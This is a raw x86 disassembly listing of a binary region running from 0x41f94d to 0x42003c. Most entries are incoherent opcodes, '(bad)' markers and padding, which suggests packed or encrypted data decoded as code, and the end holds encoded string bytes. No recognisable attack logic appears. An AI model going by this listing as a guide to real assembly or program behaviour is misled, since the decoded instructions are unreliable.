  41f94d:	daa    
  41f94e:	scas   al,BYTE PTR es:[edi]
  41f94f:	inc    edi
  41f950:	jl     0x41f97c
  41f952:	shl    BYTE PTR [edi+eax*2-0x44],0x90
  41f957:	pushf  
  41f958:	(bad)  
  41f959:	jb     0x41f9d1
  41f95b:	jle    0x41f981
  41f95d:	clc    
  41f95e:	mov    bl,0x2f
  41f960:	outs   dx,DWORD PTR ds:[esi]
  41f961:	sar    BYTE PTR [esp+eax*4],1
  41f964:	dec    esi
  41f965:	shl    DWORD PTR [ecx],cl
  41f967:	mov    bl,BYTE PTR [edi*8-0x5a51797c]
  41f96e:	fisub  DWORD PTR [ebx-0x1d5909a5]
  41f974:	xchg   edx,eax
  41f975:	push   ss
  41f976:	sbb    edi,DWORD PTR [eax+0x42c340a2]
  41f97c:	push   ds
  41f97d:	das    
  41f97e:	ror    bh,1
  41f980:	mov    esi,0xcb9e5c36
  41f985:	dec    edx
  41f986:	mov    ds:0x20832667,al
  41f98b:	lods   al,BYTE PTR ds:[esi]
  41f98c:	adc    eax,0x9ab33e2
  41f991:	jle    0x41f983
  41f993:	arpl   WORD PTR [esi-0x1],bx
  41f996:	das    
  41f997:	xor    al,0xef
  41f999:	mov    ds:0x62553232,al
  41f99e:	xor    BYTE PTR [ecx],0xc1
  41f9a1:	loope  0x41f965
  41f9a3:	mov    esi,edx
  41f9a5:	ret    
  41f9a6:	xchg   esi,eax
  41f9a7:	xchg   edi,eax
  41f9a8:	aaa    
  41f9a9:	add    dl,al
  41f9ab:	sub    edi,esi
  41f9ad:	fstp   TBYTE PTR [ecx+0x9]
  41f9b0:	cmp    DWORD PTR [esi-0x18],0xffffffe5
  41f9b4:	fild   WORD PTR [ecx-0x9]
  41f9b7:	jecxz  0x41f9bd
  41f9b9:	jp     0x41f9c0
  41f9bb:	jae    0x41fa08
  41f9bd:	nop
  41f9be:	pop    ss
  41f9bf:	push   edi
	...
  41f9c8:	add    BYTE PTR [eax],al
  41f9ca:	add    BYTE PTR [ebx-0x4293427d],dl
  41f9d0:	jle    0x41f9a5
  41f9d2:	call   DWORD PTR [eax-0x20]
  41f9d5:	cli    
  41f9d6:	call   0xa6cc:0x39e7e721
  41f9dd:	add    DWORD PTR [eax],eax
  41f9df:	lods   eax,DWORD PTR ds:[esi]
  41f9e0:	add    BYTE PTR [eax],al
  41f9e2:	add    BYTE PTR [ebp-0x5e],bh
  41f9e5:	aad    0x1c
  41f9e7:	sbb    bl,al
  41f9e9:	push   ebx
  41f9ea:	jmp    0x1a97:0x84a2063a
  41f9f1:	ror    DWORD PTR [edx-0x743b736f],1
  41f9f7:	test   DWORD PTR [ebx+ebx*1+0x68d60f39],edi
  41f9fe:	sub    al,0xe9
  41fa00:	out    dx,eax
  41fa01:	gs ds into 
  41fa04:	ret    0xa037
  41fa07:	pop    ds
  41fa08:	shr    BYTE PTR [edx+0x4facb0aa],0xe5
  41fa0f:	mov    ah,0xc5
  41fa11:	sub    BYTE PTR [esi-0x7c],0x97
  41fa15:	pop    edi
  41fa16:	pop    ss
  41fa17:	xchg   DWORD PTR [ebx+0x61],ecx
  41fa1a:	das    
  41fa1b:	or     eax,0x72cb44b0
  41fa20:	mov    edx,0x6d585c69
  41fa25:	out    dx,eax
  41fa26:	mov    dh,0x8e
  41fa28:	mov    edi,0xe3fc3c06
  41fa2d:	sub    DWORD PTR [ecx-0x1101b97a],esi
  41fa33:	xor    BYTE PTR [eax],bl
  41fa35:	mov    eax,ds:0x44ce445a
  41fa3a:	mov    dl,0x93
  41fa3c:	xchg   DWORD PTR [edx-0x7a2878cd],edi
  41fa42:	add    BYTE PTR [edi],dl
  41fa44:	jmp    0x82d85448
  41fa49:	and    bl,bh
  41fa4b:	and    esp,DWORD PTR [esi-0x6d]
  41fa4e:	cmp    al,BYTE PTR [edi]
  41fa50:	outs   dx,BYTE PTR ds:[esi]
  41fa51:	imul   esi,ebp,0x6
  41fa54:	sub    DWORD PTR [esi-0x508d9579],0x5015c296
  41fa5e:	rol    bl,0x50
  41fa61:	(bad)  
  41fa62:	pop    edx
  41fa63:	and    cl,dl
  41fa65:	mov    edi,0xd6cdc2ea
  41fa6a:	pushf  
  41fa6b:	xor    BYTE PTR [edi],ah
  41fa6d:	retf   
  41fa6e:	int3   
  41fa6f:	jae    0x41fa02
  41fa71:	inc    esp
  41fa72:	lods   al,BYTE PTR ds:[esi]
  41fa73:	mov    dl,0x46
  41fa75:	(bad)  [eax-0x6976d8da]
  41fa7b:	sub    eax,0x7896cffa
  41fa80:	adc    DWORD PTR [ebp+0x2],esp
  41fa83:	jmp    0xde24:0x2a8a5cb4
  41fa8a:	lock fwait
  41fa8c:	ja     0x41fa0f
  41fa8e:	jmp    0x41fa4a
	...
  41fa98:	add    BYTE PTR [eax],al
  41fa9a:	add    ah,bl
  41fa9c:	fincstp 
  41fa9e:	shl    bh,0xee
  41faa1:	(bad)  
  41faa2:	frstor [ecx+eax*1]
  41faa5:	pop    ebp
  41faa6:	dec    edi
  41faa7:	mov    ds:0x799ad2e9,al
  41faac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faad:	add    DWORD PTR [eax],eax
  41faaf:	lods   eax,DWORD PTR ds:[esi]
  41fab0:	add    BYTE PTR [eax],al
  41fab2:	add    dh,al
  41fab4:	xor    al,0x2a
  41fab6:	push   ecx
  41fab7:	mov    edx,0x12bb2b45
  41fabc:	pop    ss
  41fabd:	and    ebp,esi
  41fabf:	(bad)  
  41fac0:	mov    ecx,0x8c7c8f75
  41fac5:	xor    eax,0xe53b1499
  41faca:	imul   ecx,DWORD PTR [ecx-0x7151aa4b],0x66
  41fad1:	ret    
  41fad2:	or     edx,esp
  41fad4:	mov    al,ds:0xdef0b0bf
  41fad9:	mov    DWORD PTR [ecx+ebp*4],edi
  41fadc:	sbb    al,0xc2
  41fade:	mov    ?,WORD PTR [ebp+0x17]
  41fae1:	push   esp
  41fae2:	rcl    BYTE PTR [esi+0x3d6daa0b],0x54
  41fae9:	ret    0xd279
  41faec:	pop    eax
  41faed:	outs   dx,DWORD PTR ds:[esi]
  41faee:	xchg   BYTE PTR [ebx],al
  41faf0:	mov    edx,eax
  41faf2:	fidivr WORD PTR es:[ecx]
  41faf5:	enter  0xf40e,0x3e
  41faf9:	adc    al,0x42
  41fafb:	push   ecx
  41fafc:	stos   DWORD PTR es:[edi],eax
  41fafd:	pop    ebp
  41fafe:	out    0xd2,eax
  41fb00:	(bad)  
  41fb01:	aas    
  41fb02:	jbe    0x41fb0c
  41fb04:	push   edi
  41fb05:	jbe    0x41fad6
  41fb07:	mov    ebx,0x5f44162a
  41fb0c:	dec    eax
  41fb0d:	xchg   edx,eax
  41fb0e:	dec    ebp
  41fb0f:	push   esi
  41fb10:	adc    eax,0x87626a16
  41fb15:	mov    ecx,0x7ed7d3c0
  41fb1a:	not    DWORD PTR [esi+0x625b77a4]
  41fb20:	addr16 std 
  41fb22:	dec    ecx
  41fb23:	mov    cl,0xd
  41fb25:	(bad)  
  41fb26:	loopne 0x41fb61
  41fb28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb29:	js     0x41fad9
  41fb2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb2c:	aas    
  41fb2d:	jnp    0x41fabe
  41fb2f:	push   esi
  41fb30:	pop    edx
  41fb31:	test   BYTE PTR [ebx],dh
  41fb33:	dec    esp
  41fb34:	retf   0xaa4c
  41fb37:	or     eax,0xe031fda1
  41fb3c:	ins    DWORD PTR es:[edi],dx
  41fb3d:	aam    0x38
  41fb3f:	pop    es
  41fb40:	inc    ebx
  41fb41:	jnp    0x41fb9c
  41fb43:	sbb    eax,0x187f817d
  41fb48:	pop    ebx
  41fb49:	cmp    al,0x4
  41fb4b:	aam    0xd3
  41fb4d:	mov    edi,0xa35ede73
  41fb52:	call   FWORD PTR [ebp-0x3f]
  41fb55:	push   edi
  41fb56:	scas   eax,DWORD PTR es:[edi]
  41fb57:	inc    ebp
  41fb58:	xchg   ecx,eax
  41fb59:	push   0x11
  41fb5b:	cwde   
  41fb5c:	jl     0x41fba9
  41fb5e:	add    dh,cl
	...
  41fb68:	add    BYTE PTR [eax],al
  41fb6a:	add    BYTE PTR [edi-0x5e],ch
  41fb6d:	aam    0x2a
  41fb6f:	fnstsw WORD PTR [esi-0x1]
  41fb72:	out    0x52,eax
  41fb74:	fcmovu st,st(5)
  41fb76:	in     eax,0x6a
  41fb78:	jle    0x41fb89
  41fb7a:	or     esp,DWORD PTR [esi]
  41fb7c:	test   al,0x1
  41fb7e:	add    BYTE PTR [ebp+0x30000000],ch
  41fb84:	sub    esi,DWORD PTR [ebx+0x3d69080f]
  41fb8a:	jnp    0x41fbf2
  41fb8c:	cld    
  41fb8d:	push   ebp
  41fb8e:	outs   dx,BYTE PTR ds:[esi]
  41fb8f:	int    0xfa
  41fb91:	pop    esp
  41fb92:	test   bl,ch
  41fb94:	lahf   
  41fb95:	mov    al,ds:0xa1ecb2dd
  41fb9a:	inc    ebx
  41fb9b:	mov    bl,0x6f
  41fb9d:	lds    ebp,FWORD PTR [edi]
  41fb9f:	jnp    0x41fb4c
  41fba1:	stos   BYTE PTR es:[edi],al
  41fba2:	push   edi
  41fba3:	dec    esi
  41fba4:	mov    ah,0x25
  41fba6:	jnp    0x41fc06
  41fba8:	(bad)  [ebx+0x5660edf5]
  41fbae:	or     al,0xfc
  41fbb0:	adc    DWORD PTR [ebx-0x22f89994],ecx
  41fbb6:	fisttp DWORD PTR [ecx+0x1a]
  41fbb9:	ja     0x41fb8e
  41fbbb:	in     eax,dx
  41fbbc:	arpl   sp,bx
  41fbbe:	adc    eax,ebx
  41fbc0:	push   ebx
  41fbc1:	(bad)  
  41fbc2:	jae    0x41fb53
  41fbc4:	jl     0x41fbb9
  41fbc6:	ja     0x41fc44
  41fbc8:	sti    
  41fbc9:	mov    al,ds:0xa2055283
  41fbce:	inc    ebp
  41fbcf:	dec    eax
  41fbd0:	jl     0x41fc18
  41fbd2:	lock mov edi,DWORD PTR [edi+0x7c357a5b]
  41fbd9:	inc    ebx
  41fbda:	(bad)  
  41fbdb:	out    dx,eax
  41fbdc:	push   esp
  41fbdd:	jmp    0x2240f7cc
  41fbe2:	mov    ds:0x2a3b5b71,al
  41fbe7:	pop    esi
  41fbe8:	mov    ds:0x78029fe7,al
  41fbed:	fisub  WORD PTR [ebx]
  41fbef:	bound  edi,QWORD PTR [ebp+ebx*2+0x6bebc2d]
  41fbf6:	or     BYTE PTR [edx+0x33],al
  41fbf9:	fadd   st(4),st
  41fbfb:	imul   eax,DWORD PTR [edx+0x2716409],0x69
  41fc02:	jnp    0x41fb98
  41fc04:	sub    ebx,DWORD PTR [ecx+0xe]
  41fc07:	inc    ecx
  41fc08:	outs   dx,BYTE PTR ds:[esi]
  41fc09:	sahf   
  41fc0a:	in     al,dx
  41fc0b:	cmp    DWORD PTR [ebx+0x25784797],edi
  41fc11:	jmp    0x41fb98
  41fc13:	jmp    0x41fc62
  41fc15:	test   al,0x2
  41fc17:	sbb    edx,esi
  41fc19:	ins    BYTE PTR es:[edi],dx
  41fc1a:	les    esi,FWORD PTR [esi-0x4e9db0d5]
  41fc20:	div    eax
  41fc22:	sub    al,0xcd
  41fc24:	jb     0x41fc71
  41fc26:	or     BYTE PTR [edx+0x29],0xcc
  41fc2a:	or     BYTE PTR [ecx],ch
  41fc2c:	push   eax
  41fc2d:	push   es
  41fc2e:	pop    ss
  41fc2f:	rol    BYTE PTR [eax],1
	...
  41fc39:	add    BYTE PTR [eax],al
  41fc3b:	stc    
  41fc3c:	sbb    al,al
  41fc3e:	inc    esi
  41fc3f:	jecxz  0x41fc1f
  41fc41:	(bad)  
  41fc42:	mov    edi,0xe1f1bc83
  41fc47:	mov    bh,0x3c
  41fc49:	(bad)
  41fc4c:	test   al,0x1
  41fc4e:	add    BYTE PTR [ebp-0x7c000000],ch
  41fc54:	inc    ebp
  41fc55:	int3   
  41fc56:	push   esp
  41fc57:	sbb    DWORD PTR [ebx-0x71],esp
  41fc5a:	or     esp,DWORD PTR [edi]
  41fc5c:	fchs   
  41fc5e:	cld    
  41fc5f:	retf   0x9531
  41fc62:	lea    ebx,[esp+ebx*1]
  41fc65:	test   ebx,0x811453ae
  41fc6b:	adc    BYTE PTR [ebx],dh
  41fc6d:	lods   eax,DWORD PTR ds:[esi]
  41fc6e:	(bad)  
  41fc6f:	out    0xfd,eax
  41fc71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc72:	xchg   ax,ax
  41fc74:	dec    eax
  41fc75:	leave  
  41fc76:	std    
  41fc77:	xchg   edx,eax
  41fc78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc79:	xchg   ebx,eax
  41fc7a:	in     eax,dx
  41fc7b:	cdq    
  41fc7c:	push   ebx
  41fc7d:	es addr16 pop ebp
  41fc80:	test   eax,0xf3524750
  41fc85:	jbe    0x41fc96
  41fc87:	scas   eax,DWORD PTR es:[edi]
  41fc88:	jb     0x41fc11
  41fc8a:	jne    0x41fc5e
  41fc8c:	test   BYTE PTR [eax],dh
  41fc8e:	les    eax,FWORD PTR [ebp+0x7321bcc3]
  41fc94:	int3   
  41fc95:	retf   0x5d56
  41fc98:	inc    eax
  41fc99:	add    al,0x39
  41fc9b:	sbb    eax,0x93fdd181
  41fca0:	xchg   edx,eax
  41fca1:	fnsave [edx]
  41fca3:	mov    esp,0xb3afae1d
  41fca8:	or     esp,DWORD PTR [eax-0x16359eba]
  41fcae:	stos   DWORD PTR es:[edi],eax
  41fcaf:	jae    0x41fc8f
  41fcb1:	add    bl,BYTE PTR [ebx+0x2439baf]
  41fcb7:	jp     0x41fd0f
  41fcb9:	out    0xa9,eax
  41fcbb:	xchg   DWORD PTR [eax+0x62],ebx
  41fcbe:	xchg   ebx,eax
  41fcbf:	in     al,dx
  41fcc0:	mov    ?,WORD PTR [esi]
  41fcc2:	loop   0x41fd26
  41fcc4:	dec    edx
  41fcc5:	or     al,0x7
  41fcc7:	pop    esp
  41fcc8:	xchg   DWORD PTR [ecx+0x3a],ebp
  41fccb:	cmp    ebx,eax
  41fccd:	xchg   ebp,eax
  41fcce:	and    eax,DWORD PTR [esi+0x11]
  41fcd1:	mov    ah,0xc4
  41fcd3:	in     eax,dx
  41fcd4:	push   ebp
  41fcd5:	pop    edi
  41fcd6:	mov    ebp,?
  41fcd8:	sub    esp,DWORD PTR [ebx]
  41fcda:	inc    ebx
  41fcdb:	mov    ebp,0xb3e22de3
  41fce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fce1:	outs   dx,DWORD PTR ds:[esi]
  41fce2:	das    
  41fce3:	jbe    0x41fcb8
  41fce5:	leave  
  41fce6:	pop    esp
  41fce7:	xchg   BYTE PTR [bx-0xc],bh
  41fceb:	jns    0x41fca1
  41fced:	push   ebp
  41fcee:	jge    0x41fcd3
  41fcf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcf1:	xor    DWORD PTR [ebx+0x28],0x23
  41fcf5:	jl     0x41fd08
  41fcf7:	adc    DWORD PTR [edi+0x3],ebx
  41fcfa:	and    eax,0x5a6d9bc1
  41fcff:	push   ss
	...
  41fd08:	add    BYTE PTR [eax],al
  41fd0a:	add    BYTE PTR [ecx+0x3e8336b9],ah
  41fd10:	(bad)  
  41fd11:	mov    ch,0xbb
  41fd13:	icebp  
  41fd14:	and    eax,0xd0fd8c27
  41fd19:	adc    edx,0xffffff80
  41fd1c:	test   eax,0xad0001
  41fd21:	add    BYTE PTR [eax],al
  41fd23:	cld    
  41fd24:	mov    cl,0xea
  41fd26:	xchg   ebx,eax
  41fd27:	jbe    0x41fd66
  41fd29:	ret    
  41fd2a:	jb     0x41fcee
  41fd2c:	push   ss
  41fd2d:	fdivr  st(5),st
  41fd2f:	sub    ebx,ebp
  41fd31:	or     eax,0x6a19bc39
  41fd36:	mov    dl,0xc0
  41fd38:	mov    BYTE PTR [edx+0x21376b7d],dh
  41fd3e:	icebp  
  41fd3f:	or     ah,BYTE PTR [ebx+eax*8]
  41fd42:	or     esp,DWORD PTR [edx+0x72018e32]
  41fd48:	dec    eax
  41fd49:	push   ebx
  41fd4a:	push   es
  41fd4b:	or     al,0x3f
  41fd4d:	mov    dl,0xd4
  41fd4f:	adc    esp,DWORD PTR [ebx+0x5e538b03]
  41fd55:	xor    BYTE PTR [edx],ch
  41fd57:	(bad)
  41fd5b:	call   0xbc98:0xa8592a39
  41fd62:	adc    dh,BYTE PTR [ebp+edx*4+0x287d2cd4]
  41fd69:	out    0x5f,eax
  41fd6b:	rol    esi,1
  41fd6d:	lods   eax,DWORD PTR ds:[esi]
  41fd6e:	bound  esp,QWORD PTR [ecx+0x262fdd21]
  41fd74:	sub    ah,cl
  41fd76:	and    al,0x76
  41fd78:	frstpm(287 only) 
  41fd7a:	(bad)  
  41fd7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd7c:	fcmovbe st,st(3)
  41fd7e:	stos   DWORD PTR es:[edi],eax
  41fd7f:	rol    DWORD PTR [eax],1
  41fd81:	rcl    dh,1
  41fd83:	cmp    eax,0xad80e2d9
  41fd88:	sub    DWORD PTR [ecx+0x2c],edx
  41fd8b:	add    al,BYTE PTR [edx-0x3d]
  41fd8e:	cvtps2pd xmm4,QWORD PTR [ecx-0x47f59ed4]
  41fd95:	leave  
  41fd96:	pop    ds
  41fd97:	mov    edx,DWORD PTR [ebp+0x6b]
  41fd9a:	iret   
  41fd9b:	mov    bl,0x87
  41fd9d:	rcl    ch,1
  41fd9f:	fisubr WORD PTR [ebp+0x61bbace8]
  41fda5:	jmp    FWORD PTR [edx+0x322051ed]
  41fdab:	scas   al,BYTE PTR es:[edi]
  41fdac:	dec    edx
  41fdad:	sbb    eax,edi
  41fdaf:	push   ecx
  41fdb0:	scas   al,BYTE PTR es:[edi]
  41fdb1:	cs in  al,dx
  41fdb3:	mov    al,0xe4
  41fdb5:	dec    eax
  41fdb6:	push   ecx
  41fdb7:	sbb    eax,0xbe62b963
  41fdbc:	in     al,0xf8
  41fdbe:	test   DWORD PTR [ecx-0x4637fd12],eax
  41fdc4:	push   esi
  41fdc5:	iret   
  41fdc6:	test   al,0xb3
  41fdc8:	inc    ebp
  41fdc9:	out    0xdb,eax
  41fdcb:	jle    0x41fe4c
  41fdcd:	(bad)  [ecx+ecx*1+0x0]
	...
  41fdd9:	add    BYTE PTR [eax],al
  41fddb:	adc    dl,bh
  41fddd:	repz or esi,edi
  41fde0:	das    
  41fde1:	cli    
  41fde2:	fist   WORD PTR [ecx]
  41fde4:	dec    ebx
  41fde5:	es nop
  41fde7:	push   es
  41fde8:	(bad)  
  41fde9:	add    DWORD PTR [edi+0x2d],edi
  41fdec:	stos   BYTE PTR es:[edi],al
  41fded:	add    DWORD PTR [eax],eax
  41fdef:	lods   eax,DWORD PTR ds:[esi]
  41fdf0:	add    BYTE PTR [eax],al
  41fdf2:	add    BYTE PTR ds:0x51b3e754,bh
  41fdf8:	in     eax,0xae
  41fdfa:	pop    eax
  41fdfb:	or     DWORD PTR [eax+0x22416c2e],esp
  41fe01:	xlat   BYTE PTR ds:[ebx]
  41fe02:	adc    BYTE PTR [eax],0xee
  41fe05:	call   0x94cfac95
  41fe0a:	and    eax,0x18929875
  41fe0f:	cld    
  41fe10:	lea    ecx,[eax+0x3c]
  41fe13:	jge    0x41fe75
  41fe15:	push   ds
  41fe16:	mov    al,0xc
  41fe18:	scas   eax,DWORD PTR es:[edi]
  41fe19:	popa   
  41fe1a:	repz sbb eax,0xd0e6e9f1
  41fe20:	pop    eax
  41fe21:	enter  0x14c3,0x8c
  41fe25:	push   ss
  41fe26:	xor    dh,dl
  41fe28:	adc    bh,BYTE PTR [ecx-0x23]
  41fe2b:	hlt    
  41fe2c:	movaps xmm4,XMMWORD PTR [edx]
  41fe2f:	(bad)  
  41fe30:	cld    
  41fe31:	les    eax,FWORD PTR [ecx+0x7]
  41fe34:	xor    BYTE PTR [eax],dl
  41fe36:	pop    es
  41fe37:	push   cs
  41fe38:	xor    BYTE PTR [ecx],al
  41fe3a:	aas    
  41fe3b:	arpl   WORD PTR [edi],sp
  41fe3d:	mov    BYTE PTR [edx],bh
  41fe3f:	push   ss
  41fe40:	push   esi
  41fe41:	aam    0xfd
  41fe43:	push   es
  41fe44:	sbb    edx,ecx
  41fe46:	sub    ebp,DWORD PTR [edx-0x79]
  41fe49:	mov    edi,0xb63f3324
  41fe4e:	mov    ds:0x4cde910e,al
  41fe53:	out    0x65,al
  41fe55:	jle    0x41fe52
  41fe57:	ds mov esi,0x702cb551
  41fe5d:	fyl2x  
  41fe5f:	pop    ss
  41fe60:	int    0xce
  41fe62:	aaa    
  41fe63:	cmc    
  41fe64:	mov    ds:0x4da0c696,eax
  41fe69:	jg     0x41fe28
  41fe6b:	in     eax,dx
  41fe6c:	sbb    al,0xd1
  41fe6e:	inc    esi
  41fe6f:	mov    ?,eax
  41fe71:	mov    al,0x86
  41fe73:	test   ah,ah
  41fe75:	lods   eax,DWORD PTR ds:[esi]
  41fe76:	adc    esi,DWORD PTR [eax+0x9]
  41fe79:	test   al,0x4b
  41fe7b:	iret   
  41fe7c:	enter  0x5175,0x22
  41fe80:	es dec ebp
  41fe82:	rol    DWORD PTR ds:0xbccd80b6,cl
  41fe88:	xor    edx,DWORD PTR [ebx-0x47]
  41fe8b:	adc    DWORD PTR [ebx],edx
  41fe8d:	popa   
  41fe8e:	out    dx,al
  41fe8f:	arpl   WORD PTR [esp+ebx*4],bx
  41fe92:	add    DWORD PTR ds:0x8ef46fc0,edi
  41fe98:	mov    eax,DWORD PTR [ecx]
  41fe9a:	mov    cl,0xaa
  41fe9c:	out    dx,al
  41fe9d:	test   al,0x67
  41fe9f:	xor    al,0x0
	...
  41fea9:	add    BYTE PTR [eax],al
  41feab:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41feb1:	inc    edx
  41feb2:	add    BYTE PTR [eax],cl
  41feb4:	nop
  41feb5:	inc    edx
  41feb6:	add    BYTE PTR [eax+edx*4],cl
  41feb9:	inc    edx
  41feba:	add    BYTE PTR [eax],dl
  41febc:	nop
  41febd:	inc    edx
  41febe:	add    BYTE PTR [eax+edx*4],dl
  41fec1:	inc    edx
  41fec2:	add    BYTE PTR [eax],bl
  41fec4:	nop
  41fec5:	inc    edx
  41fec6:	add    BYTE PTR [eax+edx*4],bl
  41fec9:	inc    edx
  41feca:	add    BYTE PTR [esi+0x49],cl
  41fecd:	dec    esi
  41fece:	pop    edi
  41fecf:	pop    edx
  41fed0:	dec    edx
  41fed1:	inc    ecx
  41fed2:	xor    eax,DWORD PTR [eax]
  41fed4:	push   ebx
  41fed5:	push   edi
  41fed6:	inc    edi
  41fed7:	cmp    DWORD PTR [edi+0x41],ebx
  41feda:	pop    eax
  41fedb:	ss push esi
  41fedd:	pop    ecx
  41fede:	add    BYTE PTR [ebx+0x43],dl
  41fee1:	inc    ebp
  41fee2:	pop    edi
  41fee3:	inc    ecx
  41fee4:	pop    eax
  41fee5:	push   edi
  41fee6:	dec    eax
  41fee7:	inc    edx
  41fee8:	pop    edi
  41fee9:	cmp    DWORD PTR [ecx+0x4d],ecx
  41feec:	dec    ecx
  41feed:	add    BYTE PTR [ecx+0x46],al
  41fef0:	cmp    DWORD PTR [edx],esi
  41fef2:	xor    ebx,DWORD PTR [edi+0x32]
  41fef5:	aaa    
  41fef6:	inc    esp
  41fef7:	inc    esp
  41fef8:	pop    edi
  41fef9:	xor    eax,0x41545800
  41fefe:	pop    edi
  41feff:	push   ecx
  41ff00:	push   esp
  41ff01:	inc    esi
  41ff02:	push   ebp
  41ff03:	cmp    DWORD PTR [eax],eax
  41ff05:	push   edi
  41ff06:	push   ebp
  41ff07:	inc    ecx
  41ff08:	xor    dh,BYTE PTR [ebx]
  41ff0a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff0d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff11:	cmp    DWORD PTR [edi+0x38],ebx
  41ff14:	dec    ecx
  41ff15:	cmp    DWORD PTR [edx+0x36],ebx
  41ff18:	pop    edi
  41ff19:	dec    edx
  41ff1a:	xor    BYTE PTR [edx+0x34],cl
  41ff1d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff21:	xor    esi,DWORD PTR [eax]
  41ff23:	pop    edi
  41ff24:	inc    edx
  41ff25:	dec    ebx
  41ff26:	pop    eax
  41ff27:	pop    eax
  41ff28:	xor    eax,0x51414d00
  41ff2d:	pop    edi
  41ff2e:	inc    ecx
  41ff2f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff32:	inc    ecx
  41ff33:	dec    ebx
  41ff34:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff3a:	inc    ebp
  41ff3b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff3e:	ss dec eax
  41ff40:	dec    ebx
  41ff41:	add    BYTE PTR [ebp+0x57],al
  41ff44:	xor    DWORD PTR [edi+0x31],ebx
  41ff47:	dec    ebx
  41ff48:	xor    eax,DWORD PTR [ecx+0x30]
  41ff4b:	push   ebx
  41ff4c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff50:	aaa    
  41ff51:	pop    edi
  41ff52:	push   edx
  41ff53:	dec    eax
  41ff54:	dec    ebp
  41ff55:	cmp    BYTE PTR [edi+0x37],bl
  41ff58:	inc    esi
  41ff59:	xor    eax,0x35005500
  41ff5e:	add    BYTE PTR [ebx+0x0],al
  41ff61:	pop    edi
  41ff62:	add    BYTE PTR [ecx+0x0],bl
  41ff65:	dec    ecx
  41ff66:	add    BYTE PTR [ebx+0x0],dl
  41ff69:	xor    al,BYTE PTR [eax]
  41ff6b:	pop    edi
  41ff6c:	add    BYTE PTR [edx+0x0],dl
  41ff6f:	add    BYTE PTR [eax],al
  41ff71:	push   eax
  41ff72:	add    BYTE PTR [ebp+0x0],dl
  41ff75:	dec    ecx
  41ff76:	add    BYTE PTR [eax],dh
  41ff78:	add    BYTE PTR [edi+0x0],bl
  41ff7b:	inc    ebx
  41ff7c:	add    BYTE PTR [esi],dh
  41ff7e:	add    BYTE PTR [ebp+0x0],al
  41ff81:	xor    al,BYTE PTR [eax]
  41ff83:	pop    edi
  41ff84:	add    BYTE PTR [ebp+0x0],cl
  41ff87:	xor    al,0x0
  41ff89:	dec    edx
  41ff8a:	add    BYTE PTR [edx+0x0],dl
  41ff8d:	push   ebp
  41ff8e:	add    BYTE PTR [eax],al
  41ff90:	add    BYTE PTR [esi+0x0],cl
  41ff93:	cmp    DWORD PTR [eax],eax
  41ff95:	push   eax
  41ff96:	add    BYTE PTR [edi+0x0],bl
  41ff99:	push   ebp
  41ff9a:	add    BYTE PTR [ecx],bh
  41ff9c:	add    BYTE PTR [esi],dh
  41ff9e:	add    BYTE PTR [eax],dh
  41ffa0:	add    BYTE PTR [ecx],dh
  41ffa2:	add    BYTE PTR [edi+0x0],bl
  41ffa5:	dec    edi
  41ffa6:	add    BYTE PTR [esi+0x0],cl
  41ffa9:	push   esp
  41ffaa:	add    BYTE PTR [eax],bh
  41ffac:	add    BYTE PTR [eax],al
  41ffae:	add    BYTE PTR [eax+eax*1+0x34],cl
  41ffb2:	add    BYTE PTR [eax+eax*1+0x31],al
  41ffb6:	add    BYTE PTR [edi+0x0],bl
  41ffb9:	dec    ebx
  41ffba:	add    BYTE PTR [ecx],dh
  41ffbc:	add    BYTE PTR [ebp+0x0],al
  41ffbf:	pop    edi
  41ffc0:	add    BYTE PTR [edx+0x0],bl
  41ffc3:	add    BYTE PTR [eax],al
  41ffc5:	push   esp
  41ffc6:	add    BYTE PTR [edi],dh
  41ffc8:	add    BYTE PTR [ebx+0x0],al
  41ffcb:	pop    edi
  41ffcc:	add    BYTE PTR [edx+0x0],al
  41ffcf:	xor    al,BYTE PTR [eax]
  41ffd1:	xor    DWORD PTR [eax],eax
  41ffd3:	push   ebx
  41ffd4:	add    BYTE PTR [ecx],dh
  41ffd6:	add    BYTE PTR [ecx],bh
  41ffd8:	add    BYTE PTR [edx+0x0],al
  41ffdb:	add    BYTE PTR [eax],al
  41ffdd:	inc    edi
  41ffde:	add    BYTE PTR [ebp+0x0],al
  41ffe1:	xor    al,0x0
  41ffe3:	cmp    BYTE PTR [eax],al
  41ffe5:	add    BYTE PTR [eax],al
  41ffe7:	add    BYTE PTR [eax+0x42],dl
  41ffea:	add    BYTE PTR [eax+edx*2],al
  41ffed:	inc    edx
  41ffee:	add    BYTE PTR [eax],cl
  41fff0:	push   eax
  41fff1:	inc    edx
  41fff2:	add    BYTE PTR [eax+edx*2],cl
  41fff5:	inc    edx
  41fff6:	add    BYTE PTR [eax],dl
  41fff8:	push   eax
  41fff9:	inc    edx
  41fffa:	add    BYTE PTR [eax+edx*2],dl
  41fffd:	inc    edx
  41fffe:	add    BYTE PTR [eax],bl
  420000:	push   eax
  420001:	inc    edx
  420002:	add    BYTE PTR [eax+edx*2],bl
  420005:	inc    edx
  420006:	add    BYTE PTR [eax],ah
  420008:	push   eax
  420009:	inc    edx
  42000a:	add    BYTE PTR [eax+edx*2],ah
  42000d:	inc    edx
  42000e:	add    BYTE PTR [eax],ch
  420010:	push   eax
  420011:	inc    edx
	...
  420022:	add    BYTE PTR [eax],al
  420024:	call   0x0:0x4d3ef2
  42002b:	add    BYTE PTR [edx+0x0],dl
  42002e:	add    al,BYTE PTR [eax]
  420030:	add    DWORD PTR [eax],eax
  420032:	add    BYTE PTR [eax],al
  420034:	add    DWORD PTR [eax],eax
  420036:	add    BYTE PTR [eax],al
  420038:	add    DWORD PTR [eax],eax
  42003a:	add    BYTE PTR [eax],al
  42003c:	dec    eax
